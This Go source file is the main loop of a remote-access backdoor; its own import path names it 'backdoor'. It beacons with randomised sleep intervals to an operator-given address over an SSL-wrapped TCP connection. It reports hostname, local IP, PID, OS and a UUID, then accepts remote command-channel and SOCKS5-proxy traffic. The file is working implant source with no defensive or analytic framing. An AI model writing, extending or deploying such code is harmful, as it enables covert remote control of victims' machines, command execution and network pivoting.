package main

import (
	"backdoor/util"
	"encoding/json"
	"math/rand"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"time"

	"github.com/google/uuid"
)

var guuid string

func init() {
	//rand.Seed(time.Now().Unix())
	//go client()
}

func canStart(fileDir string, fileName string) bool {
	if len(fileDir) != 0 {
		os.Chdir(fileDir)
	}
	pfile, err := os.Create(fileName)
	if err != nil {
		return false
	}
	pfile.Close()
	if err := os.Rename(fileName, fileName); err != nil {
		return false
	}
	os.Open(fileName)
	return true
}

func main() {
	var dirpath string
	if execPath, err := os.Executable(); err == nil {
		dirpath = filepath.Dir(execPath)
	}
	if !canStart(dirpath, "test.txt") {
		return
	}
	if len(os.Args) < 2 {
		return
	}
	var timeout int64
	if len(os.Args) >= 3 {
		timeout, _ = strconv.ParseInt(os.Args[2], 10, 64)
	}
	guuid = uuid.New().String()
	for {
		if timeout > 0 {
			time.Sleep(time.Duration(timeout * int64(time.Second)))
		} else {
			time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
		}
		session(os.Args[1])
	}
}

// func client() {
// 	guuid = uuid.New().String()
// 	var address string
// 	for {
// 		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
// 		tmpAddress, err := getIP()
// 		if err == nil {
// 			address = tmpAddress
// 		}
// 		if len(address) == 0 {
// 			continue
// 		}
// 		session(address)
// 	}
// }

func session(address string) {
	conn, err := net.DialTimeout("tcp", address, 30*time.Second)
	if err != nil {
		return
	}
	sslconn := util.NewSSLConn(conn)
	defer sslconn.Close()
	sendInfoReq(sslconn)
	sslconn.SetReadDeadline(time.Now().Add(60 * time.Second))
	infoRsp, err := sslconn.Read()
	if err != nil {
		return
	}
	if len(infoRsp) != 2 || infoRsp[0] != 'O' || infoRsp[1] != 'K' {
		return
	}
	pcmd := NewCmdClient(sslconn)
	psocks5 := NewSocks5Client(sslconn)
	for {
		sslconn.SetReadDeadline(time.Now().Add(60 * time.Second))
		msg, err := sslconn.Read()
		if err != nil {
			break
		}
		if len(msg) == 0 {
			continue
		}
		if msg[0] == util.CMD_CHANNEL {
			pcmd.OnMsg(msg[1:])
		} else if msg[0] == util.SOCKS5_CHANNEL {
			psocks5.OnMsg(msg[1:])
		}
	}
	psocks5.OnClose()
	pcmd.OnClose()
}

func sendInfoReq(sslconn *util.SSLConn) {
	localip := sslconn.LocalAddr().String()
	hostname := ""
	if name, err := os.Hostname(); err == nil {
		hostname = name
	}
	var info util.Info
	info.HostName = hostname
	info.LocalIP = localip
	info.PID = os.Getpid()
	info.UUID = guuid
	info.OSType = runtime.GOOS
	jsonBytes, _ := json.Marshal(&info)
	sslconn.Write(jsonBytes)
}
